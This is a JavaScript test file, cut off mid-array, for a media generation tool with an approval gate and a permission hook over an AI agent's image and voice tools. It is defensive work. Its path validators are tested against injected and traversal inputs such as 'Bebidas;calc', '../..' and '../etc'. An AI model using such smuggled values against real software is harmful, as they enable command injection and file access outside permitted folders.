// Tests of the creativo's generation stack: Codex JSONL + copy, approvals, the guard hook, the MCP tools, ElevenLabs, the
// yt-dlp/ffmpeg allowlist, the product map and the launch arguments.
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { spawnSync } from 'node:child_process';
import { DatabaseSync } from 'node:sqlite';
import test from 'node:test';
import { fileURLToPath } from 'node:url';

import { APPROVAL_SCHEMA, APPROVAL_TTL_MS, argsHash, createApprovals, normalizeArgs } from './creativo-approvals.js';
import { codexEnv, CodexError, ensureChatGptLogin, findGeneratedImage, generateWithCodex, locateCodex, parseCodexJsonl, resolveCodexHome } from './creativo-codex.js';
import { bashDecision, decide, makeContext } from './creativo-guard.js';
import { buildProductMapText, getProductMap } from './creativo-map.js';
import { buildImagePrompt, copyWithoutOverwrite, countrySlug, MediaError, outputDir, resolveProductDir, safeStem, safeSubfolder } from './creativo-media.js';
import { contextFromEnv, createCreativoTools } from './creativo-mcp.js';
import { createClient, ElevenError, estimateVoice, findPreset, loadPresets, normalizeSubscription, normalizeVoices, savePresets, subscriptionRequest, ttsRequest, validatePreset, voicesRequest } from './elevenlabs.js';
import { createStreamParser } from './stream-parser.js';
import { makeDataDir } from './seed-fixture.js';
import { AGENTS } from './registry.js';
import { loadSettings, saveSettings } from './settings.js';
import { runTurn } from './turn.js';

const HERE = path.dirname(fileURLToPath(import.meta.url));
const FAKE = path.join(HERE, 'fixtures', 'fake-claude.js');
const mkTmp = (name) => fs.mkdtempSync(path.join(os.tmpdir(), `${name}-`));
const PNG = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==', 'base64');
const rmTmp = (dir) => fs.rmSync(dir, { recursive: true, force: true });

/** A workspace with a product, plus a fake Codex home that already holds a generated image. */
function workspace() {
  const tmp = mkTmp('gen');
  const root = path.join(tmp, 'ventas');
  fs.mkdirSync(path.join(root, 'Producto Bebidas', 'venezuela'), { recursive: true });
  fs.mkdirSync(path.join(root, 'producto ideas', 'Producto barf'), { recursive: true });
  const codexHome = path.join(tmp, 'codex-home');
  const thread = '01a191f9-b96d-7da0-a7c7-f79fc39cf601';
  fs.mkdirSync(path.join(codexHome, 'generated_images', thread), { recursive: true });
  const image = path.join(codexHome, 'generated_images', thread, 'exec-1.png');
  fs.writeFileSync(image, PNG);
  return { tmp, root, codexHome, thread, image };
}

const jsonl = (thread, text) => [
  JSON.stringify({ type: 'thread.started', thread_id: thread }),
  JSON.stringify({ type: 'turn.started' }),
  JSON.stringify({ type: 'item.completed', item: { id: 'item_0', type: 'agent_message', text } }),
  JSON.stringify({ type: 'turn.completed', usage: { input_tokens: 10, output_tokens: 2 } }),
].join('\n');

// ---- Codex ---------------------------------------------------------------------------------------------------------

test('codex JSONL: thread, last message, usage and errors are parsed; junk lines are ignored', () => {
  const p = parseCodexJsonl(`Reading additional input from stdin...\n${jsonl('t-1', 'C:\\Users\\victo\\AppData\\Roaming\\orca\\codex-runtime-home\\home\\generated_images\\t-1\\exec-1.png')}\nnot json\n{"type":"error","message":"boom"}`);
  assert.equal(p.threadId, 't-1');
  assert.match(p.finalMessage, /generated_images/);
  assert.deepEqual(p.usage, { input_tokens: 10, output_tokens: 2 });
  assert.deepEqual(p.errors, ['boom']);
  assert.equal(p.candidates.length, 1);
  assert.deepEqual(parseCodexJsonl('').messages, []);
  assert.deepEqual(parseCodexJsonl(['{"type":"turn.failed","error":{"message":"quota"}}']).errors, ['quota']);
});

test('codex image lookup: the path of the last message, the thread folder as fallback, and nothing outside Codex\'s own folder', () => {
  const w = workspace();
  try {
    const parsed = parseCodexJsonl(jsonl(w.thread, `Listo: ${w.image}`));
    assert.equal(findGeneratedImage(parsed, { codexHome: w.codexHome }), path.resolve(w.image));
    // No path in the message: the newest image of the thread's folder.
    assert.equal(findGeneratedImage(parseCodexJsonl(jsonl(w.thread, 'hecho')), { codexHome: w.codexHome }), w.image);
    // A path outside generated_images is never accepted, even if it exists.
    const secret = path.join(w.tmp, 'secret.png');
    fs.writeFileSync(secret, PNG);
    assert.equal(findGeneratedImage(parseCodexJsonl(jsonl('other-thread', secret)), { codexHome: w.codexHome }), null);
    assert.equal(findGeneratedImage(parseCodexJsonl(jsonl(w.thread, 'C:\\Windows\\win.png')), { codexHome: w.codexHome }), w.image, 'falls back to the thread folder, not the invented path');
  } finally {
    rmTmp(w.tmp);
  }
});

test('codex environment: CODEX_HOME from the setting, then the env, then ~/.codex; API keys are removed from the child', () => {
  assert.equal(resolveCodexHome({ override: 'D:/x', env: { CODEX_HOME: 'E:/y' }, home: 'H' }), 'D:/x');
  assert.equal(resolveCodexHome({ env: { CODEX_HOME: 'E:/y' }, home: 'H' }), 'E:/y');
  assert.equal(resolveCodexHome({ env: {}, home: 'H' }), path.join('H', '.codex'));
  const env = codexEnv({ env: { OPENAI_API_KEY: 'k', OPENAI_BASE_URL: 'u', CODEX_API_KEY: 'c', PATH: 'p', CODEX_HOME: 'old' }, codexHome: 'new' });
  assert.deepEqual(Object.keys(env).sort(), ['CODEX_HOME', 'PATH']);
  assert.equal(env.CODEX_HOME, 'new');
});

test('codex location: PATH shim resolved to the package script', () => {
  const seen = new Set(['C:\\npm\\codex.cmd', 'C:\\npm\\node_modules\\@openai\\codex\\bin\\codex.js']);
  const found = locateCodex({ env: { PATH: 'C:\\npm' }, platform: 'win32', home: 'H', fileExists: (f) => seen.has(f) });
  assert.equal(found.command, process.execPath);
  assert.ok(found.prefixArgs[0].endsWith('codex.js'));
  assert.equal(locateCodex({ env: { PATH: '' }, platform: 'win32', home: 'H', fileExists: () => false }), null);
});

test('codex login: only ChatGPT counts; otherwise the user is told to run codex login', async () => {
  const says = (stdout, stderr = '') => async () => ({ code: 0, stdout, stderr });
  assert.equal(await ensureChatGptLogin({}, { runFn: says('Logged in using ChatGPT') }), true);
  await assert.rejects(ensureChatGptLogin({}, { runFn: says('Not logged in') }), (e) => e instanceof CodexError && /codex login/.test(e.message));
  await assert.rejects(ensureChatGptLogin({}, { runFn: says('Logged in using an API key') }), /clave de API/);
});

test('generateWithCodex: explicit model and low effort, prompt through stdin, no API key, cleans its scratch folder', async () => {
  const w = workspace();
  try {
    const calls = [];
    const runFn = async (codex, args, opts) => {
      calls.push({ args, opts });
      if (args[0] === 'login') return { code: 0, stdout: 'Logged in using ChatGPT', stderr: '' };
      return { code: 0, stdout: jsonl(w.thread, w.image), stderr: '' };
    };
    const res = await generateWithCodex({ instruction: 'haz una imagen', codex: { command: 'codex', prefixArgs: [] }, codexHome: w.codexHome, env: { OPENAI_API_KEY: 'sk-no', PATH: 'p' }, runFn });
    assert.equal(res.file, path.resolve(w.image));
    assert.deepEqual(res.size, { width: 1, height: 1 });
    const exec = calls.find((c) => c.args[0] === 'exec');
    assert.deepEqual(exec.args.slice(0, 4), ['exec', '--json', '--skip-git-repo-check', '-s']);
    assert.equal(exec.args[exec.args.indexOf('-m') + 1], 'gpt-6.1-terra');
    assert.ok(exec.args.includes('model_reasoning_effort=low'));
    assert.equal(exec.args.at(-1), '-');
    assert.equal(exec.opts.stdin, 'haz una imagen');
    assert.equal('OPENAI_API_KEY' in exec.opts.env, false);
    assert.equal(exec.opts.env.CODEX_HOME, w.codexHome);
    assert.equal(fs.existsSync(exec.opts.cwd), false, 'scratch folder removed');
    await assert.rejects(generateWithCodex({ instruction: 'x', codex: null, codexHome: w.codexHome }), /Codex/);
    await assert.rejects(generateWithCodex({ instruction: 'x', codex: {}, codexHome: w.codexHome, checkLogin: false, runFn: async () => ({ code: 0, stdout: '{"type":"error","message":"sin cupo"}', stderr: '' }) }), /sin cupo/);
  } finally {
    rmTmp(w.tmp);
  }
});

// ---- media layout and prompt rules -----------------------------------------------------------------------------------

test('copy without overwrite: the same name gets -2, -3 and the original is untouched', () => {
  const tmp = mkTmp('copy');
  try {
    const src = path.join(tmp, 'a.png');
    fs.writeFileSync(src, PNG);
    const dir = path.join(tmp, 'out', 'imagenes');
    const one = copyWithoutOverwrite(src, dir, 'hero', '.png');
    fs.writeFileSync(one, 'ORIGINAL');
    const two = copyWithoutOverwrite(src, dir, 'hero', '.png');
    const three = copyWithoutOverwrite(src, dir, 'hero', '.png');
    assert.deepEqual([path.basename(one), path.basename(two), path.basename(three)], ['hero.png', 'hero-2.png', 'hero-3.png']);
    assert.equal(fs.readFileSync(one, 'utf8'), 'ORIGINAL');
  } finally {
    rmTmp(tmp);
  }
});

test('output folders follow the product layout and refuse paths outside the workspace', () => {
  const w = workspace();
  try {
    assert.equal(resolveProductDir(w.root, 'Bebidas'), path.join(w.root, 'Producto Bebidas'));
    assert.equal(resolveProductDir(w.root, 'producto bebidas'), path.join(w.root, 'Producto Bebidas'));
    for (const bad of ['', '..', '../x', 'Bebidas/../..', 'C:\\Windows', 'Bebidas;calc', 'ideas']) assert.throws(() => resolveProductDir(w.root, bad), MediaError, bad);
    assert.throws(() => resolveProductDir(w.root, 'Nada'), /Productos disponibles: Producto Bebidas/);
    assert.equal(countrySlug('México '), 'mexico');
    for (const bad of ['', '../x', 'a', 'Perú/x', 'x'.repeat(40)]) assert.throws(() => countrySlug(bad), MediaError, bad);
    assert.equal(outputDir({ root: w.root, product: 'Bebidas', country: 'venezuela', kind: 'image' }), path.join(w.root, 'Producto Bebidas', 'venezuela', 'imagenes'));
    assert.equal(outputDir({ root: w.root, product: 'Bebidas', country: 'venezuela', kind: 'image', subfolder: 'pruebas-codex' }), path.join(w.root, 'Producto Bebidas', 'venezuela', 'imagenes', 'pruebas-codex'));
    assert.equal(outputDir({ root: w.root, product: 'Bebidas', country: 'venezuela', kind: 'pdf-asset', pdfKind: 'cover' }), path.join(w.root, 'Producto Bebidas', 'pdf', 'venezuela', 'arte', 'portadas'));
    assert.equal(outputDir({ root: w.root, product: 'Bebidas', country: 'mexico', kind: 'audio' }), path.join(w.root, 'Producto Bebidas', 'audios', 'mexico'));
    assert.throws(() => safeSubfolder('../../x'), MediaError);
    assert.throws(() => safeSubfolder('a/b/c/d'), MediaError);
    assert.equal(safeStem('../../evil name.png', 'x'), 'evil-name');
    assert.equal(safeStem('', 'fallback'), 'fallback');
  } finally {
    rmTmp(w.tmp);
  }
});

test('image prompt: the house rules always travel with the request', () => {
  const p = buildImagePrompt({ prompt: 'una michelada con sal', aspect: '9:16' });
  assert.match(p, /1024x1536/);
  assert.match(p, /una michelada con sal/);
  assert.match(p, /Do not put any text, letters, numbers, logos/);
  assert.match(p, /never crop/);
  assert.match(p, /absolute path/);
  assert.match(buildImagePrompt({ prompt: 'x yy zz', purpose: 'reel' }), /do not show a person facing the camera/);
  assert.match(buildImagePrompt({ prompt: 'x yy zz', text: '¡Sí!' }), /exactly this[^]*¡Sí!/);
  assert.match(buildImagePrompt({ prompt: 'x yy zz', aspect: 'square', pdfKind: 'illustration' }), /1024x1024[^]*plain clean white background/);
  assert.throws(() => buildImagePrompt({ prompt: 'x', aspect: 'panorama' }), MediaError);
});

// ---- approvals -------------------------------------------------------------------------------------------------------

const memoryApprovals = (now) => {
  const db = new DatabaseSync(':memory:');
  db.exec(APPROVAL_SCHEMA);
  return createApprovals(db, now ? { now } : undefined);
};
const imageItem = (prompt = 'una michelada') => ({ tool: 'generate_image', args: { prompt, product: 'Bebidas', country: 'venezuela' }, label: prompt, units: { images: 1 } });

test('approval hash ignores key order, blanks and padding but not content', () => {
  const a = argsHash('generate_image', { prompt: ' una michelada ', product: 'Bebidas', country: 'venezuela', filename: '' });
  const b = argsHash('generate_image', { country: 'venezuela', product: 'Bebidas', prompt: 'una michelada' });
  assert.equal(a, b);
  assert.notEqual(a, argsHash('generate_image', { country: 'mexico', product: 'Bebidas', prompt: 'una michelada' }));
  assert.notEqual(a, argsHash('design_pdf_asset', { country: 'venezuela', product: 'Bebidas', prompt: 'una michelada' }));
  assert.deepEqual(normalizeArgs({ b: 1, a: { d: null, c: 2 } }), { a: { c: 2 }, b: 1 });
});

test('approvals: nothing runs before the user decides, an approval is spent once, and a different argument is not covered', () => {
  const approvals = memoryApprovals();
  const proposal = approvals.propose({ sessionId: 's', summary: 'dos imágenes', items: [imageItem('uno'), imageItem('dos')] });
  const [one, two] = proposal.items;
  assert.equal(proposal.status, 'pending');
  assert.match(approvals.consume('generate_image', one.hash).reason, /todavía no aprobó/);
  assert.match(approvals.consume('generate_image', argsHash('generate_image', { prompt: 'no propuesta' })).reason, /no fue propuesta/);
  assert.deepEqual(approvals.decide(proposal.id, true), { ok: true, status: 'approved' });
  assert.equal(approvals.decide(proposal.id, false).ok, false, 'decided once');
  assert.equal(approvals.begin('generate_image', one.hash), null, 'the tool cannot start without the hook having spent the approval');
  assert.equal(approvals.consume('generate_image', one.hash).ok, true);
  assert.match(approvals.consume('generate_image', one.hash).reason, /ya se usó/);
  assert.equal(approvals.consume('design_pdf_asset', two.hash).ok, false, 'another tool with the same hash is not covered');
  const itemId = approvals.begin('generate_image', one.hash);
  assert.ok(itemId);
  assert.equal(approvals.begin('generate_image', one.hash), null, 'one run per approval');
  approvals.finish(itemId, { ok: true, result: { ruta: 'x' } });
  assert.equal(approvals.get(proposal.id).items[0].status, 'done');
  assert.equal(approvals.consume('generate_image', two.hash).ok, true);
});

test('approvals: a rejection blocks, an old approval expires, and only pending proposals can be decided', () => {
  let t = 1_000;
  const approvals = memoryApprovals(() => t);
  const rejected = approvals.propose({ items: [imageItem('a')] });
  approvals.decide(rejected.id, false);
  assert.match(approvals.consume('generate_image', rejected.items[0].hash).reason, /rechazó/);
  const old = approvals.propose({ items: [imageItem('b')] });
  approvals.decide(old.id, true);
  t += APPROVAL_TTL_MS + 1;
  assert.match(approvals.consume('generate_image', old.items[0].hash).reason, /venció/);
  assert.equal(approvals.decide(9999, true).ok, false);
  assert.throws(() => approvals.propose({ items: [] }), /nada que generar/);
  assert.throws(() => approvals.propose({ items: [{ tool: 'Bash', args: {} }] }), /no permitida/);
  assert.deepEqual(approvals.list({ status: 'pending' }), []);
});

test('guard: a generation tool passes only with a matching approval, once (hook logic and the real hook process)', () => {
  const approvals = memoryApprovals();
  const args = { prompt: 'una michelada', product: 'Bebidas', country: 'venezuela' };
  const opts = { root: 'C:\\ventas', pluginDir: '', skillsDir: '', home: 'C:\\Users\\x', consume: (t, h) => approvals.consume(t, h) };
  const call = (input) => decide({ tool_name: 'mcp__creativo__generate_image', tool_input: input }, opts);
  assert.equal(call(args).decision, 'deny');
  const proposal = approvals.propose({ items: [{ tool: 'generate_image', args, label: 'x', units: { images: 1 } }] });
  assert.equal(call(args).decision, 'deny', 'still pending');
  approvals.decide(proposal.id, true);
  assert.equal(call({ ...args, prompt: 'otra cosa' }).decision, 'deny', 'other arguments');
  assert.equal(call(args).decision, 'allow');
  assert.equal(call(args).decision, 'deny', 'spent');
});

test('the hook process reads the approval table: allow once, then deny; fail closed without a database', () => {
  const tmp = mkTmp('hook');
  try {
    const dbFile = path.join(tmp, 'agent.db');
    const db = new DatabaseSync(dbFile);
    db.exec(APPROVAL_SCHEMA);
    const approvals = createApprovals(db);
    const args = { kind: 'cover', prompt: 'portada acuarela', product: 'Bebidas', country: 'venezuela' };
    const p = approvals.propose({ items: [{ tool: 'design_pdf_asset', args, label: 'x', units: { images: 1 } }] });
    approvals.decide(p.id, true);
    db.close();
    const guard = path.join(HERE, 'creativo-guard.js');
    const run = (extra) => spawnSync(process.execPath, ['--disable-warning=ExperimentalWarning', guard, '--root', tmp, ...extra], { input: JSON.stringify({ tool_name: 'mcp__creativo__design_pdf_asset', tool_input: args }), encoding: 'utf8' });
    const verdict = (r) => JSON.parse(r.stdout).hookSpecificOutput.permissionDecision;
    assert.equal(verdict(run(['--db', dbFile])), 'allow');
    assert.equal(verdict(run(['--db', dbFile])), 'deny');
    assert.equal(verdict(run([])), 'deny');
  } finally {
    rmTmp(tmp);
  }
});

// ---- MCP tools -------------------------------------------------------------------------------------------------------

function toolsFor(w, extra = {}) {
  const db = new DatabaseSync(':memory:');
  db.exec(APPROVAL_SCHEMA);
  const approvals = createApprovals(db);
  const generated = [];
  const ctx = {
    root: w.root, sessionId: 's1', approvals, presets: () => [], hasElevenKey: false, eleven: () => { throw new ElevenError('Falta la clave de ElevenLabs. Guárdala en la sección Voces.'); },
    generateImage: async (instruction) => {
      generated.push(instruction);
      return { file: w.image, size: { width: 1, height: 1 } };
    },
    ...extra,
  };
  const tools = Object.fromEntries(createCreativoTools(ctx).map((t) => [t.name, t.handler]));
  return { tools, approvals, ctx, generated };
}

/** The user approves the proposal and the hook spends one approval per item (what happens in a real turn). */
const approveAndSpend = (approvals, proposalId) => {
  approvals.decide(proposalId, true);
  for (const it of approvals.get(proposalId).items) approvals.consume(it.tool, it.hash);
};

test('MCP: propose_generation validates, stores and returns the exact arguments to reuse', async () => {
  const w = workspace();
  try {
    const { tools, approvals } = toolsFor(w);
    const args = { prompt: 'michelada con borde de sal', product: 'Bebidas', country: 'venezuela', filename: 'michelada' };
    const out = await tools.propose_generation({ summary: 'una foto', items: [{ tool: 'generate_image', args }] });
    assert.equal(out.estado, 'esperando_aprobacion');
    assert.equal(out.imagenes, 1);
    assert.deepEqual(out.elementos[0].argumentos_exactos, args);
    assert.match(out.instruccion, /TERMINA tu turno/);
    assert.equal(approvals.get(out.proposal_id).status, 'pending');
    assert.match((await tools.propose_generation({ items: [{ tool: 'generate_image', args: { ...args, product: 'Nada' } }] })).error, /Elemento 1: No encuentro el producto/);
    assert.match((await tools.propose_generation({ items: [{ tool: 'generate_image', args: { ...args, prompt: 'x' } }] })).error, /Describe la imagen/);
    assert.match((await tools.propose_generation({ items: [{ tool: 'design_pdf_asset', args: { ...args, kind: 'poster' } }] })).error, /kind debe ser/);
    assert.match((await tools.propose_generation({ items: [{ tool: 'Bash', args: {} }] })).error, /no permitida/);
    assert.match((await tools.propose_generation({ items: [] })).error, /Faltan los elementos/);
    assert.match((await tools.propose_generation({ items: Array.from({ length: 13 }, () => ({ tool: 'generate_image', args })) })).error, /Máximo 12/);
  } finally {
    rmTmp(w.tmp);
  }
});

test('MCP: generate_image refuses without approval, and with one copies the image into the product folder without overwriting', async () => {
  const w = workspace();
  try {
    const { tools, approvals, generated } = toolsFor(w);
    const args = { prompt: 'michelada con borde de sal', product: 'Bebidas', country: 'venezuela', filename: 'michelada', subfolder: 'pruebas-codex', purpose: 'reel' };
    assert.match((await tools.generate_image(args)).error, /No hay una aprobación vigente/);
    assert.equal(generated.length, 0, 'nothing was generated');
    // Approved but never spent by the hook: still refused (the handler checks again).
    const p1 = await tools.propose_generation({ items: [{ tool: 'generate_image', args }] });
    approvals.decide(p1.proposal_id, true);
    assert.match((await tools.generate_image(args)).error, /No hay una aprobación vigente/);
    approvals.consume('generate_image', approvals.get(p1.proposal_id).items[0].hash);
    const first = await tools.generate_image(args);
    assert.equal(first.ok, true, first.error);
    const expectedDir = path.join(w.root, 'Producto Bebidas', 'venezuela', 'imagenes', 'pruebas-codex');
    assert.equal(first.ruta, path.join(expectedDir, 'michelada.png'));
    assert.equal(first.ruta_relativa, 'Producto Bebidas/venezuela/imagenes/pruebas-codex/michelada.png');
    assert.equal(first.ancho, 1);
    assert.match(generated[0], /do not show a person facing the camera/);
    // Same approved arguments once more: the approval is spent.
    assert.match((await tools.generate_image(args)).error, /No hay una aprobación vigente/);
    // A second approved run with the same filename must not replace the first file.
    fs.writeFileSync(first.ruta, 'ORIGINAL');
    const p2 = await tools.propose_generation({ items: [{ tool: 'generate_image', args }] });
    approveAndSpend(approvals, p2.proposal_id);
    const second = await tools.generate_image(args);
    assert.equal(path.basename(second.ruta), 'michelada-2.png');
    assert.equal(fs.readFileSync(first.ruta, 'utf8'), 'ORIGINAL');
  } finally {
    rmTmp(w.tmp);
  }
});

test('MCP: design_pdf_asset goes to pdf/<país>/arte/<tipo> and a generation failure is reported, not hidden', async () => {
  const w = workspace();
  try {
    const { tools, approvals, generated } = toolsFor(w);
    const args = { kind: 'cover', prompt: 'portada acuarela de frutas', product: 'Bebidas', country: 'venezuela', filename: 'portada-06' };
    const p = await tools.propose_generation({ items: [{ tool: 'design_pdf_asset', args }] });
    approveAndSpend(approvals, p.proposal_id);
    const done = await tools.design_pdf_asset(args);
    assert.equal(done.ruta_relativa, 'Producto Bebidas/pdf/venezuela/arte/portadas/portada-06.png');
    assert.match(generated[0], /calm area where a title can be placed/);
    const failing = toolsFor(w, { generateImage: async () => { throw new CodexError('Codex no tiene la sesión iniciada. Abre una terminal y ejecuta `codex login`.'); } });
    const p2 = await failing.tools.propose_generation({ items: [{ tool: 'design_pdf_asset', args }] });
    approveAndSpend(failing.approvals, p2.proposal_id);
    assert.match((await failing.tools.design_pdf_asset(args)).error, /codex login/);
    assert.equal(failing.approvals.get(p2.proposal_id).items[0].status, 'failed');
  } finally {
    rmTmp(w.tmp);
  }
});

test('MCP: generate_voice shows characters and credits in the proposal, runs only once approved and writes to audios/<país>', async () => {
  const w = workspace();
  try {
    const seen = [];
    const fetchFn = async (url, init) => {
      seen.push({ url, init });
      if (url.endsWith('/v1/user/subscription')) return { ok: true, status: 200, json: async () => ({ tier: 'creator', character_count: 3625, character_limit: 10000 }) };
      return { ok: true, status: 200, arrayBuffer: async () => new TextEncoder().encode('MP3DATA').buffer };
    };
    const preset = { id: 've', name: 'Venezuela', voiceId: 'AbCdEfGh12345678', modelId: 'eleven_multilingual_v2', stability: 0.4, similarity: 0.8, style: 0.1, speakerBoost: true, product: 'Bebidas', country: 'venezuela' };
    const { tools, approvals } = toolsFor(w, { presets: () => [preset], hasElevenKey: true, eleven: () => createClient({ key: 'xi-secret-key', fetchFn }) });
    const args = { text: '¡Hola pana! Esto es una prueba.', preset: 'Venezuela', product: 'Bebidas', country: 'venezuela', filename: 'guion-01' };
    const p = await tools.propose_generation({ items: [{ tool: 'generate_voice', args }] });
    assert.equal(p.caracteres, 31);
    assert.equal(p.creditos_elevenlabs, 31);
    assert.equal(p.creditos_elevenlabs_disponibles, 6375);
    assert.equal(seen.filter((s) => s.url.includes('text-to-speech')).length, 0, 'proposing never synthesizes');
    assert.match((await tools.generate_voice(args)).error, /No hay una aprobación vigente/);
    assert.equal(seen.filter((s) => s.url.includes('text-to-speech')).length, 0);
    approveAndSpend(approvals, p.proposal_id);
    const out = await tools.generate_voice(args);
    assert.equal(out.ok, true, out.error);
    assert.equal(out.ruta_relativa, 'Producto Bebidas/audios/venezuela/guion-01.mp3');
    assert.equal(fs.readFileSync(out.ruta, 'utf8'), 'MP3DATA');
    const tts = seen.find((s) => s.url.includes('text-to-speech'));
    assert.ok(tts.url.includes('/v1/text-to-speech/AbCdEfGh12345678'));
    assert.equal(tts.init.headers['xi-api-key'], 'xi-secret-key');
    const body = JSON.parse(tts.init.body);
    assert.deepEqual(body.voice_settings, { stability: 0.4, similarity_boost: 0.8, style: 0.1, use_speaker_boost: true });
    assert.ok(!JSON.stringify(out).includes('xi-secret-key') && !JSON.stringify(p).includes('xi-secret-key'));
    assert.match((await tools.propose_generation({ items: [{ tool: 'generate_voice', args: { ...args, preset: 'Nadie' } }] })).error, /No existe el preset "Nadie"/);
    assert.match((await tools.propose_generation({ items: [{ tool: 'generate_voice', args: { text: 'hola', product: 'Bebidas', country: 'mexico' } }] })).error, /Indica preset o voice_id/);
    assert.deepEqual((await tools.list_voice_presets()).presets.map((x) => x.nombre), ['Venezuela']);
  } finally {
    rmTmp(w.tmp);
  }
});

test('MCP: the server context comes from the environment and never exposes the key in the tool list', () => {
  const w = workspace();
  try {
    const ctx = contextFromEnv({ AGENTAUTO_DATA_DIR: path.join(w.tmp, 'data'), AGENTAUTO_CREATIVO_ROOT: w.root, AGENTAUTO_CODEX_HOME: w.codexHome, AGENTAUTO_CODEX_CMD: '{"command":"codex","prefixArgs":[]}', AGENTAUTO_ELEVEN_KEY: 'xi-abc' });
    assert.equal(ctx.root, w.root);
    assert.equal(ctx.hasElevenKey, true);
    assert.ok(fs.existsSync(path.join(w.tmp, 'data', 'agents', 'creativo', 'agent.db')));
    const listing = JSON.stringify(createCreativoTools(ctx).map(({ name, description, inputSchema }) => ({ name, description, inputSchema })));
    assert.ok(!listing.includes('xi-abc'));
    assert.deepEqual(createCreativoTools(ctx).map((t) => t.name), ['propose_generation', 'list_voice_presets', 'generate_image', 'design_pdf_asset', 'generate_voice']);
    ctx.db.close();
  } finally {
    rmTmp(w.tmp);
  }
});

// ---- ElevenLabs -------------------------------------------------------------------------------------------------------

test('ElevenLabs request builders: URL, headers, body and validation', () => {
  const v = voicesRequest('KEY');
  assert.equal(v.url, 'https://api.elevenlabs.io/v1/voices');
  assert.equal(v.init.headers['xi-api-key'], 'KEY');
  assert.equal(subscriptionRequest('KEY').url, 'https://api.elevenlabs.io/v1/user/subscription');
  const t = ttsRequest('KEY', { voiceId: 'O5hbneAmtjLMgfg5UFIm', text: 'Hola', settings: { stability: 2, similarity: -1, style: 'x' } });
  assert.equal(t.url, 'https://api.elevenlabs.io/v1/text-to-speech/O5hbneAmtjLMgfg5UFIm?output_format=mp3_44100_128');
  assert.equal(t.init.method, 'POST');
  assert.deepEqual(JSON.parse(t.init.body), { text: 'Hola', model_id: 'eleven_multilingual_v2', voice_settings: { stability: 1, similarity_boost: 0, style: 0, use_speaker_boost: true } });
  assert.throws(() => ttsRequest('K', { voiceId: '../x', text: 'a' }), ElevenError);
  assert.throws(() => ttsRequest('K', { voiceId: 'O5hbneAmtjLMgfg5UFIm', text: '   ' }), /vacío/);
  assert.throws(() => ttsRequest('K', { voiceId: 'O5hbneAmtjLMgfg5UFIm', text: 'a'.repeat(10_001) }), /10000/);
  assert.throws(() => ttsRequest('K', { voiceId: 'O5hbneAmtjLMgfg5UFIm', text: 'a', modelId: 'Bad Model' }), /modelo/);
});

test('ElevenLabs credits: one per character, half for the flash and turbo models', () => {
  assert.deepEqual(estimateVoice({ text: 'Hola ¿qué tal?' }), { chars: 14, credits: 14, modelId: 'eleven_multilingual_v2' });
  assert.equal(estimateVoice({ text: 'a'.repeat(101), modelId: 'eleven_flash_v2_5' }).credits, 51);
  assert.equal(estimateVoice({ text: '' }).credits, 0);
});

test('ElevenLabs client with a fake fetch: voices, subscription, friendly errors that never contain the key', async () => {
  const respond = (status, body) => async () => ({ ok: status < 400, status, json: async () => body, text: async () => (typeof body === 'string' ? body : JSON.stringify(body)), arrayBuffer: async () => new ArrayBuffer(2) });
  const voices = await createClient({ key: 'k', fetchFn: respond(200, { voices: [{ voice_id: 'O5hbneAmtjLMgfg5UFIm', name: 'Maria', category: 'cloned', preview_url: 'https://x/p.mp3', labels: { accent: 've' } }, { name: 'sin id' }, { voice_id: 'B', name: 'raro', preview_url: 'http://insecure' }] }) }).voices();
  assert.equal(voices.length, 2);
  assert.equal(voices[0].previewUrl, 'https://x/p.mp3');
  assert.equal(voices[1].previewUrl, null);
  assert.deepEqual(await createClient({ key: 'k', fetchFn: respond(200, { tier: 'creator', character_count: 3625, character_limit: 10000, next_character_count_reset_unix: 1790000000, status: 'active' }) }).subscription(), { tier: 'creator', status: 'active', used: 3625, limit: 10000, remaining: 6375, resetsAt: 1790000000 });
  await assert.rejects(createClient({ key: 'sk-LEAK', fetchFn: respond(401, 'bad key sk-LEAK') }).voices(), (e) => /401/.test(e.message) && !e.message.includes('sk-LEAK'));
  await assert.rejects(createClient({ key: 'k', fetchFn: respond(402, { detail: 'quota_exceeded' }) }).tts({ voiceId: 'O5hbneAmtjLMgfg5UFIm', text: 'a' }), /créditos/);
  await assert.rejects(createClient({ key: 'sk-LEAK', fetchFn: async () => { throw new Error('connect sk-LEAK failed'); } }).voices(), (e) => !e.message.includes('sk-LEAK'));
  assert.throws(() => createClient({ key: '  ' }), /Falta la clave/);
  assert.deepEqual(normalizeVoices(null), []);
  assert.equal(normalizeSubscription({}).remaining, 0);
});

test('voice presets: validated, saved in the data folder and found by name or by product and country', () => {
  const tmp = mkTmp('presets');
  try {
    assert.deepEqual(loadPresets(tmp), []);
    const saved = savePresets(tmp, [{ name: 'Venezuela', voiceId: 'O5hbneAmtjLMgfg5UFIm', product: 'Bebidas', country: 'Venezuela', stability: 0.4, similarity: 0.8, style: 0.05, speakerBoost: false }, { name: 'México', voiceId: 'FIhWHKTvfI9sX1beLEJ8', country: 'mexico' }]);
    assert.equal(saved[0].country, 'venezuela');
    assert.equal(saved[1].modelId, 'eleven_multilingual_v2');
    assert.equal(loadPresets(tmp).length, 2);
    assert.equal(findPreset(loadPresets(tmp), { preset: 'venezuela' }).voiceId, 'O5hbneAmtjLMgfg5UFIm');
    assert.equal(findPreset(loadPresets(tmp), { product: 'Producto Bebidas', country: 'venezuela' }).name, 'Venezuela');
    assert.equal(findPreset(loadPresets(tmp), { product: 'Otro', country: 'venezuela' }), null);
    assert.equal(findPreset(loadPresets(tmp), { country: 'mexico' }).name, 'México');
    assert.throws(() => validatePreset({ name: '', voiceId: 'O5hbneAmtjLMgfg5UFIm' }), /nombre/);
    assert.throws(() => validatePreset({ name: 'x', voiceId: '../etc' }), /ID de voz/);
    assert.throws(() => savePresets(tmp, [{ name: 'x', voiceId: 'bad id' }]), ElevenError);
    fs.writeFileSync(path.join(tmp, 'voices', 'presets.json'), '{broken');
    assert.deepEqual(loadPresets(tmp), []);
  } finally {
    rmTmp(tmp);
  }
});

// ---- reference videos: yt-dlp and ffmpeg --------------------------------------------------------------------------------

test('guard: yt-dlp downloads need an explicit output in the workspace and a URL; dangerous options are refused', () => {
  const ctx = makeContext({ root: 'C:\\ventas', pluginDir: '', skillsDir: 'C:\\Users\\x\\.claude\\skills', home: 'C:\\Users\\x' });
  const ok = [
